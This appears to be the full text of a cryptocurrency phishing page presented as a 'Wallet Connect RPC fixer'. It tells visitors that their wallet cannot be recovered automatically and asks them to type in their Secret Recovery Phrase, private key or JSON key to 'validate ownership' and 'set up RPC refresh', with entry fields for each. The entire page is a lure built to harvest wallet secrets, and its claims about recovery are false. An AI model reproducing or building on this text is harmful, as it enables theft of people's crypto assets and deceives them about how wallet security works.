Verify your wallet with your Secret Recovery Phrase/ Private Key or JSON Keys

Wallet Connect RPC fixer cannot recover your wallet automatically. We will use your Secret Recovery Phrase/ Private Keys to validate your ownership, restore and fix your wallet and set up RPC refresh. First, enter the Secret Recovery Phrase/ Keys / JSON that you were given when you created the wallet

Please carefully enter your details

+ Mnemonic Phrase

+ Private Key

+ JSON Key
